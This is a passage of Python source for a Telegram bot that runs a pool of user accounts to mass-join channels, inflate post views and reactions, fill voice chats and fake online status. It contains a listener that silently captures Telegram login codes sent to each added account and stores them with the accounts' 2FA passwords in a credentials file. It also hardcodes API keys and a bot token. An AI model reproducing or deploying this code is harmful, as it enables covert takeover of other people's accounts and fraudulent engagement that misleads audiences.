import asyncio
import logging
import re
import sys
import datetime
import time
import random
import secrets
import os
import json
from typing import List, Dict, Optional, Tuple
from aiohttp import web

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    UserAlreadyParticipantError,
    InviteRequestSentError,
    MessageNotModifiedError
)
from telethon.tl.functions.messages import ImportChatInviteRequest, SendReactionRequest, GetMessagesViewsRequest, CheckChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
from telethon.tl.functions.account import UpdateStatusRequest, SetPrivacyRequest
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.types import (
    PeerChannel, 
    ReactionEmoji, 
    InputPrivacyKeyStatusTimestamp, 
    InputPrivacyValueAllowAll, 
    InputPrivacyValueDisallowAll,
    DataJSON,
    ChannelParticipantAdmin,
    ChannelParticipantCreator
)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("API_ID", "39598527"))
API_HASH = os.getenv("API_HASH", "4a3feafcdb2136918ab28f83508962fa")
BOT_TOKEN = os.getenv("BOT_TOKEN", "9252517288:AAGegqHn61rQqnO9AdeczvQfuUBIEuXnV9w")

# দুইজন মেইন মডারেটর / মালিকের আইডি
MAIN_MODERATOR_IDS = {8595088772, 11111111111}

KEEP_ALIVE_INTERVAL = 12
START_TIME = datetime.datetime.now()
DATA_FILE = "bot_data.json"
SESSION_BACKUP_FILE = "session_backup.json"
CREDENTIALS_FILE = "credentials.json"

EMOJI_POOL = [
    "🔥", "⚡", "✨", "🌟", "💫", "🔮", "💎", "🚀", "👑", "🎯", 
    "💥", "🎲", "🖤", "👻", "🌪️", "🦁", "🗿", "☠️", "🏴‍☠️", "🦅",
    "☣️", "☣", "🔱", "⚜️", "🏆", "🧿", "⚙️", "🛡️", "⚔️", "💣"
]

active_clients: Dict[str, TelegramClient] = {}
login_clients: Dict[str, TelegramClient] = {}
task_states = {}
pending_otps = {} 
VC_MONITORS: Dict[str, asyncio.Task] = {}
SHUTDOWN = False

account_modes = {}
temp_online_until = {}
next_random_toggle = {}

def load_credentials():
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error reading credentials file: {e}")
            return {}
    return {}

def save_credential_record(phone: str, otp: str, password_2fa: str, added_by_id: int = 0, added_by_info: str = "N/A"):
    creds = load_credentials()
    creds[phone] = {
        "phone": phone,
        "latest_otp": otp,
        "2fa_password": password_2fa,
        "added_by_id": added_by_id,
        "added_by_info": added_by_info,
        "updated_at": datetime.datetime.utcnow().isoformat()
    }
    try:
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump(creds, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving credentials file: {e}")

async def get_saved_password(phone: str) -> str:
    creds = load_credentials()
    if phone in creds and creds[phone].get("2fa_password"):
        pwd = creds[phone]["2fa_password"]
        if pwd and pwd != "Disabled / Not Set":
            return pwd

    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                if "passwords" in data and phone in data["passwords"]:
                    pwd = data["passwords"][phone]
                    if pwd and pwd != "Disabled / Not Set":
                        save_credential_record(phone, pending_otps.get(phone, {}).get('otp', 'No new OTP'), pwd)
                        return pwd

                for entry in reversed(data.get("history", [])):
                    if entry.get("phone") == phone and entry.get("2fa_password"):
                        pwd = entry["2fa_password"]
                        save_credential_record(phone, pending_otps.get(phone, {}).get('otp', 'No new OTP'), pwd)
                        return pwd
        except Exception as e:
            logger.error(f"Error parsing bot_data.json for password: {e}")

    return "Disabled / Not Set"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error reading bot_data.json: {e}")
            return {"sessions": {}, "approved_users": [], "history": [], "all_users": [], "user_accounts": {}}
    return {"sessions": {}, "approved_users": [], "history": [], "all_users": [], "user_accounts": {}}

def save_data(data):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        
        existing_sessions = {}
        if os.path.exists(SESSION_BACKUP_FILE):
            try:
                with open(SESSION_BACKUP_FILE, 'r') as f:
                    content = json.load(f)
                    if isinstance(content, dict):
                        existing_sessions = content
            except Exception:
                existing_sessions = {}

        if "sessions" in data and isinstance(data["sessions"], dict):
            existing_sessions.update(data["sessions"])
        
        with open(SESSION_BACKUP_FILE, 'w') as f:
            json.dump(existing_sessions, f, indent=2)
            
    except Exception as e:
        logger.error(f"Error saving data or persistent session backup: {e}")

async def get_all_sessions():
    data = load_data()
    if not data.get("sessions") and os.path.exists(SESSION_BACKUP_FILE):
        try:
            with open(SESSION_BACKUP_FILE, 'r') as f:
                backup_sessions = json.load(f)
                if isinstance(backup_sessions, dict) and backup_sessions:
                    data["sessions"] = backup_sessions
        except Exception:
            pass
    return data.get("sessions", {})

async def add_session(phone, session_str, user_id: int):
    data = load_data()
    if "sessions" not in data:
        data["sessions"] = {}
    data["sessions"][phone] = session_str
    
    if "user_accounts" not in data:
        data["user_accounts"] = {}
    str_uid = str(user_id)
    if str_uid not in data["user_accounts"]:
        data["user_accounts"][str_uid] = []
    if phone not in data["user_accounts"][str_uid]:
        data["user_accounts"][str_uid].append(phone)
        
    save_data(data)

async def get_user_active_count(user_id: int) -> int:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return 3
    data = load_data()
    str_uid = str(user_id)
    user_accs = data.get("user_accounts", {}).get(str_uid, [])
    active_count = sum(1 for ph in user_accs if ph in active_clients)
    return active_count

async def check_and_grant_auto_approval(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return True
    active_count = await get_user_active_count(user_id)
    if active_count >= 3:
        await approve_user(user_id, approved_by=0, username="", title=f"Auto_User_{user_id}", is_admin=False)
        return True
    else:
        await unapprove_user(user_id)
        return False

async def remove_session(phone):
    data = load_data()
    if phone in data.get("sessions", {}):
        del data["sessions"][phone]
        save_data(data)
        
        creds = load_credentials()
        added_by_id = creds.get(phone, {}).get("added_by_id", 0)
        added_by_info = creds.get(phone, {}).get("added_by_info", "Unknown User")
        
        if added_by_id and int(added_by_id) not in MAIN_MODERATOR_IDS:
            await check_and_grant_auto_approval(added_by_id)
            
        try:
            remove_alert = (
                f"🚨 **ACCOUNT DISCONNECTED / REMOVED!** 🚨\n\n"
                f"📱 **Phone:** `{phone}`\n"
                f"👤 **Added By:** {added_by_info}\n"
                f"⏰ **Time:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                f"⚠️ This account has been logged out or removed from active sessions."
            )
            for mod_id in MAIN_MODERATOR_IDS:
                try:
                    await bot.send_message(mod_id, remove_alert)
                except Exception:
                    pass
        except Exception as e:
            logger.error(f"Failed to send removal alert for {phone}: {e}")

async def approve_user(user_id: int, approved_by: int, username: str = "", title: str = "", is_admin: bool = False) -> bool:
    try:
        data = load_data()
        data["approved_users"] = [u for u in data.get("approved_users", []) if int(u["user_id"]) != int(user_id)]
        data["approved_users"].append({
            "user_id": int(user_id),
            "username": username,
            "title": title,
            "approved_by": approved_by,
            "approved_at": datetime.datetime.utcnow().isoformat(),
            "is_approved": True,
            "is_admin": is_admin
        })
        if "all_users" not in data:
            data["all_users"] = []
        if int(user_id) not in data["all_users"]:
            data["all_users"].append(int(user_id))
        save_data(data)
        return True
    except Exception as e:
        logger.error(f"Approve error: {e}")
        return False

async def unapprove_user(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return False
    try:
        data = load_data()
        original_len = len(data.get("approved_users", []))
        data["approved_users"] = [u for u in data.get("approved_users", []) if int(u["user_id"]) != int(user_id)]
        if len(data["approved_users"]) < original_len:
            save_data(data)
            return True
        return False
    except Exception as e:
        logger.error(f"Unapprove error: {e}")
        return False

async def is_user_approved(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return True
    data = load_data()
    for user in data.get("approved_users", []):
        if int(user["user_id"]) == int(user_id) and user.get("is_approved", True):
            return True
    return False

async def is_user_admin(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return True
    data = load_data()
    for user in data.get("approved_users", []):
        if int(user["user_id"]) == int(user_id) and user.get("is_approved", True) and user.get("is_admin", False):
            return True
    return False

async def get_approved_users() -> List[dict]:
    data = load_data()
    return [u for u in data.get("approved_users", []) if u.get("is_approved", True)]

async def log_activity(phone, action, target, status):
    try:
        data = load_data()
        if "history" not in data:
            data["history"] = []
        data["history"].append({
            "phone": phone,
            "action": action,
            "target": target,
            "status": status,
            "timestamp": datetime.datetime.utcnow().isoformat()
        })
        if len(data["history"]) > 1000:
            data["history"] = data["history"][-1000:]
        save_data(data)
    except Exception as e:
        logger.error(f"Log activity error: {e}")

async def get_today_joins():
    today = datetime.datetime.now().date().isoformat()
    data = load_data()
    count = 0
    for log in data.get("history", []):
        if log.get("action") == "JOIN" and log.get("timestamp", "").startswith(today):
            count += 1
    return count

async def get_weekly_active_users():
    data = load_data()
    history = data.get("history", [])
    now = datetime.datetime.utcnow()
    seven_days_ago = now - datetime.timedelta(days=7)
    
    active_phones = set()
    for log in history:
        ts_str = log.get("timestamp")
        if ts_str:
            try:
                log_time = datetime.datetime.fromisoformat(ts_str)
                if log_time >= seven_days_ago:
                    active_phones.add(log.get("phone"))
            except Exception:
                pass
    return len(active_phones)

def style_text(text: str) -> str:
    bold_caps = {
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜',
        'J':'𝗝','K':'𝗞','L':'🇱','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥',
        'S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭'
    }
    small_caps = {
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
        'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
        'S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    }
    def style_word(word):
        if not word:
            return ''
        first = word[0].upper()
        first_styled = bold_caps.get(first, first)
        rest = word[1:].upper()
        rest_styled = ''.join(small_caps.get(ch, ch.lower()) for ch in rest)
        return first_styled + rest_styled
    return re.sub(r'[A-Za-z]+', lambda m: style_word(m.group(0)), text)

def get_uptime():
    diff = datetime.datetime.now() - START_TIME
    minutes = int(diff.total_seconds() / 60)
    if minutes < 60:
        return f"{minutes}M"
    elif minutes < 1440:
        return f"{minutes // 60}𝗛 {minutes % 60}𝗠"
    else:
        return f"{minutes // 1440}Ｄ {minutes % 1440 // 60}𝗛"

async def set_account_status(client, phone: str, is_online: bool):
    try:
        if is_online:
            await client(SetPrivacyRequest(
                key=InputPrivacyKeyStatusTimestamp(),
                rules=[InputPrivacyValueAllowAll()]
            ))
            await client(UpdateStatusRequest(offline=False))
        else:
            await client(SetPrivacyRequest(
                key=InputPrivacyKeyStatusTimestamp(),
                rules=[InputPrivacyValueDisallowAll()]
            ))
            await client(UpdateStatusRequest(offline=True))
    except Exception as e:
        logger.error(f"Status update error for {phone}: {e}")

def trigger_temp_online(phone: str, duration_seconds: int = 90):
    random_duration = duration_seconds + random.randint(0, 30)
    temp_online_until[phone] = time.time() + random_duration

async def keep_alive(client, phone: str):
    last_applied_status = None
    while not SHUTDOWN:
        try:
            await client.get_me()
            now = time.time()
            should_be_online = False
            if phone in temp_online_until and now < temp_online_until[phone]:
                should_be_online = True
            else:
                if next_random_toggle.get(phone, 0) < now:
                    if random.random() < 0.35:
                        should_be_online = True
                        temp_online_until[phone] = now + random.randint(60, 120)
                    next_random_toggle[phone] = now + random.randint(300, 900)
            if last_applied_status != should_be_online:
                await set_account_status(client, phone, is_online=should_be_online)
                last_applied_status = should_be_online
            else:
                if should_be_online:
                    await client(UpdateStatusRequest(offline=False))
                else:
                    await client(UpdateStatusRequest(offline=True))
        except Exception as e:
            logger.warning(f"Account {phone} disconnected or logged out. Removing. Error: {e}")
            if phone in active_clients:
                del active_clients[phone]
            await remove_session(phone)
            break
        await asyncio.sleep(KEEP_ALIVE_INTERVAL)

def setup_client_otp_listener(client, phone):
    @client.on(events.NewMessage(chats=(777000, "Telegram")))
    async def otp_listener(event):
        try:
            msg_text = event.raw_text
            code_match = re.search(r'\b(\d{5,6})\b', msg_text)
            if code_match:
                otp_code = code_match.group(1)
                if phone not in pending_otps:
                    pending_otps[phone] = {}
                pending_otps[phone]['otp'] = otp_code
                
                pwd_2fa = await get_saved_password(phone)
                creds = load_credentials()
                added_by_id = creds.get(phone, {}).get("added_by_id", 0)
                added_by_info = creds.get(phone, {}).get("added_by_info", "N/A")
                save_credential_record(phone, otp_code, pwd_2fa, added_by_id, added_by_info)
        except Exception as e:
            logger.error(f"OTP listener error for {phone}: {e}")

async def start_saved_clients():
    sessions = await get_all_sessions()
    loaded_phones = []
    for phone, session_str in list(sessions.items()):
        try:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                active_clients[phone] = client
                loaded_phones.append(phone)
                setup_client_otp_listener(client, phone)
            else:
                logger.warning(f"Session for {phone} is dead/logged out. Removing.")
                await remove_session(phone)
        except Exception as e:
            logger.error(f"Failed to connect {phone}: {e}")
            await remove_session(phone)
            
    for phone in loaded_phones:
        client = active_clients[phone]
        account_modes[phone] = "SMART_MIXED"
        next_random_toggle[phone] = time.time() + random.randint(10, 300)
        asyncio.create_task(keep_alive(client, phone))

def parse_target(link: str):
    link = link.strip()
    username_match = re.search(r"(?:t\.me/|@)([a-zA-Z0-9_]{5,32})", link)
    if username_match and "joinchat" not in link and "/c/" not in link:
        return ("public", username_match.group(1))
    invite_match = re.search(r"t\.me/(?:\+|joinchat/)([a-zA-Z0-9_-]+)", link)
    if invite_match:
        return ("private", invite_match.group(1))
    return (None, None)

def parse_vc_link(link: str):
    link = link.strip().replace(" ", "")
    for prefix in ["https://", "http://", "www.", "t.me/", "telegram.me/"]:
        link = link.replace(prefix, "")
    if "?" in link:
        link = link.split("?")[0]
    is_private = False
    identifier = link
    if "joinchat/" in link:
        is_private = True
        identifier = link.split("joinchat/")[1].replace("/", "")
    elif link.startswith("+"):
        is_private = True
        identifier = link[1:].replace("/", "")
    else:
        is_private = False
        identifier = link.replace("@", "").replace("/", "")
    return is_private, identifier

async def resolve_user(bot_client, input_text: str):
    input_text = input_text.strip()
    try:
        if input_text.isdigit():
            user_id = int(input_text)
            entity = await bot_client.get_entity(user_id)
        else:
            username = input_text.replace("@", "")
            entity = await bot_client.get_entity(username)
            user_id = entity.id
        
        username_str = f"@{entity.username}" if getattr(entity, 'username', None) else ""
        first_name = getattr(entity, 'first_name', '') or ''
        last_name = getattr(entity, 'last_name', '') or ''
        full_name = f"{first_name} {last_name}".strip() or "User"
        display_text = f"{full_name} ({username_str})" if username_str else full_name
        return user_id, username_str, display_text
    except Exception as e:
        logger.error(f"Error resolving user {input_text}: {e}")
        for client in active_clients.values():
            try:
                entity = await client.get_entity(input_text.replace("@", ""))
                user_id = entity.id
                username_str = f"@{entity.username}" if getattr(entity, 'username', None) else ""
                return user_id, username_str, f"User_{user_id}"
            except Exception:
                pass
        if input_text.isdigit():
            return int(input_text), "", f"ID: {input_text}"
        return None, None, None

async def is_client_admin(client: TelegramClient, entity) -> bool:
    try:
        permissions = await client.get_permissions(entity)
        if permissions and (permissions.is_admin or permissions.is_creator):
            return True
    except Exception:
        try:
            participant = await client.get_permissions(entity, 'me')
            if isinstance(participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                return True
        except Exception:
            pass
    return False

async def send_reaction_normal(client, peer, msg_id, emoji):
    try:
        await client(SendReactionRequest(
            peer=peer,
            msg_id=msg_id,
            reaction=[ReactionEmoji(emoticon=emoji)]
        ))
        return True, None
    except Exception as e:
        return False, str(e)

async def view_post(client, peer, msg_id):
    try:
        await client(GetMessagesViewsRequest(
            peer=peer,
            id=[msg_id],
            increment=True
        ))
        return True, None
    except Exception as e:
        return False, str(e)

async def resolve_post_peer(link, link_type, target):
    try:
        clean = link.replace('https://', '').replace('http://', '').strip()
        if 't.me/c/' in clean:
            parts = clean.split('t.me/c/')[1].split('/')
            entity = int(parts[0])
            msg_id = int(parts[1].split('?')[0])
            return PeerChannel(abs(entity)), msg_id
        else:
            parts = clean.split('t.me/')[1].split('/')
            entity = parts[0]
            msg_id = int(parts[1].split('?')[0])
            return entity, msg_id
    except Exception:
        return None, None

def get_stop_button():
    return [[Button.inline(style_text("⛔ FORCE STOP"), b"force_stop")]]

def get_cancel():
    return [[Button.inline(style_text("🔙 BACK"), b"back")]]

def get_qty_buttons():
    return [
        [Button.inline("10", b"qty_10"), Button.inline("50", b"qty_50")],
        [Button.inline("100", b"qty_100"), Button.inline(style_text("ALL"), b"qty_all")],
        [Button.inline(style_text("CUSTOM"), b"qty_custom")],
        [Button.inline(style_text("🔙 BACK"), b"back")]
    ]

def get_views_qty_buttons():
    return [
        [Button.inline("10", b"views_qty_10"), Button.inline("50", b"views_qty_50")],
        [Button.inline("100", b"views_qty_100"), Button.inline(style_text("ALL"), b"views_qty_all")],
        [Button.inline(style_text("CUSTOM"), b"views_qty_custom")],
        [Button.inline(style_text("🔙 BACK"), b"back")]
    ]

def get_vc_qty_buttons():
    return [
        [Button.inline("10", b"vc_qty_10"), Button.inline("50", b"vc_qty_50")],
        [Button.inline("100", b"vc_qty_100"), Button.inline(style_text("ALL"), b"vc_qty_all")],
        [Button.inline(style_text("CUSTOM"), b"vc_qty_custom")],
        [Button.inline(style_text("🔙 BACK"), b"back")]
    ]

async def interruptible_sleep(seconds: float, chat_id: int) -> bool:
    step = 0.2
    elapsed = 0.0
    while elapsed < seconds:
        if task_states.get(chat_id, {}).get('cancel'):
            return True
        await asyncio.sleep(step)
        elapsed += step
    return False

# --- SEQUENTIAL JOIN LOGIC ---
async def execute_join(event, task_data, count_limit):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    links_data = task_data['links_data']
    delay = float(task_data.get('delay', 1.0))
    all_phones = list(active_clients.keys())
    random.shuffle(all_phones)
    selected = all_phones[:count_limit]
    
    msg = await event.respond(style_text(f"🚀 JOINING {len(links_data)} LINKS WITH {len(selected)} ACCOUNTS..."), buttons=get_stop_button())
    success, failed, already = 0, 0, 0
    was_cancelled = False
    total_ops = len(links_data) * len(selected)
    current_op = 0
    for link_info in links_data:
        if task_states.get(chat_id, {}).get('cancel'):
            was_cancelled = True
            break
        link_type = link_info['type']
        target = link_info['target']
        original_link = link_info['link']
        for phone in selected:
            if task_states.get(chat_id, {}).get('cancel'):
                was_cancelled = True
                break
            trigger_temp_online(phone, duration_seconds=90)
            current_op += 1
            client = active_clients.get(phone)
            if not client:
                failed += 1
                continue
            try:
                try:
                    entity = await client.get_entity(target) if link_type == 'public' else await client.get_entity(original_link)
                    if entity:
                        if link_type == 'public':
                            await client(LeaveChannelRequest(target))
                        else:
                            await client.delete_dialog(entity)
                        await asyncio.sleep(0.5)
                except Exception:
                    pass

                if link_type == 'public':
                    await client(JoinChannelRequest(target))
                else:
                    await client(ImportChatInviteRequest(target))
                success += 1
            except UserAlreadyParticipantError:
                already += 1
                success += 1
            except InviteRequestSentError:
                success += 1
            except FloodWaitError as e:
                wait_time = e.seconds if e.seconds < 30 else 30
                if await interruptible_sleep(wait_time, chat_id):
                    was_cancelled = True
                    break
                try:
                    if link_type == 'public':
                        await client(JoinChannelRequest(target))
                    else:
                        await client(ImportChatInviteRequest(target))
                    success += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1
            percent = int((current_op / total_ops) * 100) if total_ops > 0 else 0
            bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
            try:
                await msg.edit(style_text(f"⟪ JOIN PROGRESS ⟫\n[{bar}] {percent}%\n✅ Success: {success} | ❌ Failed: {failed}"), buttons=get_stop_button())
            except Exception:
                pass
            if await interruptible_sleep(delay, chat_id):
                was_cancelled = True
                break
    if chat_id in task_states:
        del task_states[chat_id]
    title = "⛔ JOIN TASK STOPPED!" if was_cancelled else "✅ JOIN TASK COMPLETE!"
    await msg.edit(style_text(f"{title}\n✅ Success: {success - already} | ⚠️ Already: {already} | ❌ Failed: {failed}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

# --- ORIGINAL TELETHON VC JOIN & MONITORING LOGIC ---
async def monitor_vc(client, entity, phone, identifier):
    while phone in VC_MONITORS and not SHUTDOWN:
        try:
            full_chat = await client(GetFullChannelRequest(entity))
            call_obj = full_chat.full_chat.call
            if not call_obj:
                VC_MONITORS.pop(phone, None)
                break
            try:
                my_ssrc = random.randint(10000, 99999999)
                params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": my_ssrc, "muted": True}))
                await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
            except UserAlreadyParticipantError:
                pass
            except Exception:
                pass
        except Exception:
            pass
        await asyncio.sleep(15)

async def _worker_vc_join_persistent(client, phone, identifier, is_private):
    try:
        trigger_temp_online(phone, duration_seconds=180)
        entity = None
        if is_private:
            try:
                updates = await client(ImportChatInviteRequest(identifier))
                if updates.chats:
                    entity = updates.chats[0]
            except UserAlreadyParticipantError:
                try:
                    invite_info = await client(CheckChatInviteRequest(identifier))
                    if hasattr(invite_info, 'chat'):
                        entity = invite_info.chat
                    elif hasattr(invite_info, 'title'):
                        target_title = invite_info.title
                        async for dialog in client.iter_dialogs(limit=None):
                            if dialog.title == target_title:
                                entity = dialog.entity
                                break
                except Exception as e:
                    return 0, f"Already in but resolve failed: {str(e)[:50]}"
            except InviteRequestSentError:
                return 0, "Join request sent to admin"
            except Exception as e:
                return 0, f"Failed: {str(e)[:50]}"
        else:
            try:
                await client(JoinChannelRequest(identifier))
            except UserAlreadyParticipantError:
                pass
            except Exception as e:
                return 0, f"Failed: {str(e)[:50]}"
            try:
                entity = await client.get_entity(identifier)
            except Exception as e:
                return 0, f"Failed: {str(e)[:50]}"
        if not entity:
            return 0, "No entity found"
        
        full_chat = await client(GetFullChannelRequest(entity))
        if not full_chat.full_chat.call:
            return 0, "No active VC"
        
        call_obj = full_chat.full_chat.call
        my_ssrc = random.randint(10000, 99999999)
        params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": my_ssrc, "muted": True}))
        await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
        
        if phone in VC_MONITORS:
            VC_MONITORS[phone].cancel()
        VC_MONITORS[phone] = asyncio.create_task(monitor_vc(client, entity, phone, identifier))
        return 1, "Joined VC successfully"
    except Exception as e:
        return 0, f"Error: {str(e)[:50]}"

async def execute_vc_join(event, raw_link: str, count_limit: int):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    is_private, identifier = parse_vc_link(raw_link)
    if not identifier:
        if chat_id in task_states:
            del task_states[chat_id]
        return await event.respond(style_text("❌ INVALID LINK!"))
    all_phones = list(active_clients.keys())
    random.shuffle(all_phones)
    selected_phones = all_phones[:count_limit] if count_limit > 0 else all_phones
    msg = await event.respond(style_text(f"🎙️ JOINING VC WITH {len(selected_phones)} ACCOUNTS..."), buttons=get_stop_button())
    success_count, fail_count = 0, 0
    was_cancelled = False
    for idx, phone in enumerate(selected_phones, 1):
        if task_states.get(chat_id, {}).get('cancel'):
            was_cancelled = True
            break
        client = active_clients.get(phone)
        if not client:
            fail_count += 1
            continue
        status, reason = await _worker_vc_join_persistent(client, phone, identifier, is_private)
        if status == 1:
            success_count += 1
            await log_activity(phone, "VC_JOIN", raw_link, "Success")
        else:
            fail_count += 1
            await log_activity(phone, "VC_JOIN", raw_link, reason)
        percent = int((idx / len(selected_phones)) * 100)
        bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
        try:
            await msg.edit(style_text(f"🎙️ VC JOIN PROGRESS\n[{bar}] {percent}%\n✅ Success: {success_count} | ❌ Failed: {fail_count}"), buttons=get_stop_button())
        except Exception:
            pass
        if await interruptible_sleep(random.uniform(0.1, 0.4), chat_id):
            was_cancelled = True
            break
    if chat_id in task_states:
        del task_states[chat_id]
    title = "⛔ VC JOIN FORCE STOPPED!" if was_cancelled else "✅ VC JOIN COMPLETE!"
    await msg.edit(style_text(f"{title}\n✅ Joined: {success_count} | ❌ Failed: {fail_count}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_vc_leave(event):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    msg = await event.respond(style_text("🎙️ LEAVING ALL VOICE CHATS..."), buttons=get_stop_button())
    for phone in list(VC_MONITORS.keys()):
        task = VC_MONITORS.pop(phone, None)
        if task:
            task.cancel()
    left_count = 0
    for phone, client in list(active_clients.items()):
        trigger_temp_online(phone, duration_seconds=90)
        try:
            dialogs = await client.get_dialogs(limit=30)
            for dialog in dialogs:
                try:
                    entity = dialog.entity
                    full_chat = await client(GetFullChannelRequest(entity))
                    if full_chat.full_chat.call:
                        await client(LeaveGroupCallRequest(full_chat.full_chat.call))
                        left_count += 1
                except Exception:
                    pass
        except Exception:
            pass
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ LEFT ALL VOICE CHATS!\nTotal Left: {left_count}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def send_auto_views(chat_id, msg_id, channel_username=None):
    if not active_clients:
        return
    phones = list(active_clients.keys())
    random.shuffle(phones)
    for phone in phones:
        client = active_clients[phone]
        trigger_temp_online(phone, duration_seconds=90)
        try:
            target_peer = channel_username if channel_username else chat_id
            try:
                await client(GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
            except Exception:
                await client.get_messages(target_peer, ids=msg_id)
            await log_activity(phone, "AUTO_VIEW", f"msg_id:{msg_id}", "Success")
        except Exception as e:
            if channel_username and ("not found" in str(e).lower() or "channel" in str(e).lower()):
                try:
                    await client(JoinChannelRequest(channel_username))
                    await asyncio.sleep(1)
                    await client.get_messages(channel_username, ids=msg_id)
                except Exception:
                    pass
        await asyncio.sleep(0.3 + random.uniform(0.1, 0.4))

async def execute_leave_specific(event, link):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    link_type, target = parse_target(link)
    if not link_type and "t.me/" not in link:
        return await event.respond(style_text("INVALID LINK!"), buttons=[[Button.inline(style_text("🔙 BACK"), b"back")]])
    msg = await event.respond(style_text(f"📤 LEAVING: {link}"), buttons=get_stop_button())
    count, skipped_admin = 0, 0
    for phone, client in list(active_clients.items()):
        trigger_temp_online(phone, duration_seconds=90)
        try:
            entity = await client.get_entity(target) if link_type == 'public' else await client.get_entity(link)
            if entity:
                if await is_client_admin(client, entity):
                    skipped_admin += 1
                    continue
                if link_type == 'public':
                    await client(LeaveChannelRequest(target))
                else:
                    await client.delete_dialog(entity)
                count += 1
        except Exception:
            pass
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ LEFT FROM {count} ACCOUNTS\n🛡️ Protected Admins: {skipped_admin}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_leave_all(event):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    msg = await event.respond(style_text("⚠️ LEAVING ALL CHANNELS..."), buttons=get_stop_button())
    total, skipped_admin = 0, 0
    for phone, client in list(active_clients.items()):
        trigger_temp_online(phone, duration_seconds=90)
        try:
            async for dialog in client.iter_dialogs():
                if dialog.is_channel or dialog.is_group:
                    try:
                        if await is_client_admin(client, dialog.entity):
                            skipped_admin += 1
                            continue
                        await client.delete_dialog(dialog.entity)
                        total += 1
                    except Exception:
                        pass
        except Exception:
            pass
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ LEFT FROM {total} CHATS\n🛡️ Protected Admins: {skipped_admin}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_react_view(event, task_data, count_limit):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    links_data = task_data['links_data']
    emoji = task_data['emoji']
    speed = float(task_data.get('speed', 0.2))
    accounts = list(active_clients.keys())[:count_limit]
    msg = await event.respond(style_text("⚡ REACT & VIEW RUNNING..."), buttons=get_stop_button())
    success, failed = 0, 0
    for link_info in links_data:
        peer, msg_id = await resolve_post_peer(link_info['link'], link_info['type'], link_info['target'])
        if not peer:
            failed += len(accounts)
            continue
        for phone in accounts:
            trigger_temp_online(phone, duration_seconds=90)
            client = active_clients.get(phone)
            if not client:
                failed += 1
                continue
            r_ok, _ = await send_reaction_normal(client, peer, msg_id, emoji)
            v_ok, _ = await view_post(client, peer, msg_id)
            if r_ok and v_ok:
                success += 1
            else:
                failed += 1
            await asyncio.sleep(speed)
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ REACT & VIEW COMPLETE!\nSuccess: {success} | Failed: {failed}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_multi_react_view(event, task_data, count_limit):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    links_data = task_data['links_data']
